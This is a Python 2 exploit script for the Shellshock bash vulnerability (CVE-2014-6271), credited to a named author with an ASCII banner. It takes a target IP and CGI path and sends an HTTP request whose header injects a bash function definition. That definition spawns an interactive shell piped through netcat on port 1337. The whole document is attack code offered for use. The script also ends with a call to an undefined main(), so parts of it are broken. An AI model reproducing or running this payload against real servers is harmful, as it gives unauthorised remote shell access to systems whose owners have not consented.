#!/usr/bin/env python
# bash-shell 0day CVE-2014-6271

import sys, os, httplib

def cleaner():
	if 'linux' in sys.platform:
		os.system('clear')
	else:
		os.system('cls')

def banner():
	cleaner()
	print '''
______           _           _____     _             
| ___ \         | |         |  _  |   | |            
| |_/ / __ _ ___| |__ ______| |/' | __| | __ _ _   _ 
| ___ \/ _` / __| '_ \______|  /| |/ _` |/ _` | | | |
| |_/ / (_| \__ \ | | |     \ |_/ / (_| | (_| | |_| |
\____/ \__,_|___/_| |_|      \___/ \__,_|\__,_|\__, |
                                                __/ |
                                               |___/ 
#####################################################

Author: Muhammad Adeel aka Stoker
Mail:   Chaudhary1337@gmail.com
Blog:   http://urdusecurity.blogspot.com

#####################################################
\n'''

def exploit(ip, uri):
	var = httplib.HTTPConnection(ip)
	back_connect = "() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1337 > /tmp/f'"
	headers = {
			"Content-type" : "application/x-www-form-urlencoded",
			"Attck" : back_connect
			}
	request = var.request("GET", uri ,headers=headers).getresponse()
	if request.status == 200:
		print "[+] Connect on PORT 1337"
		exit("Quiting!")
	else:
		print "[-] Not vulnerable."
		exit()

if __name__ == '__main__':
	banner()
	if len(sys.argv) < 2:
		print "\nUsage: {0} <IP> <Vuln CGI Path>".format(sys.argv[0])
		exit()
	exploit(sys.argv[1], sys.argv[2])
	main()
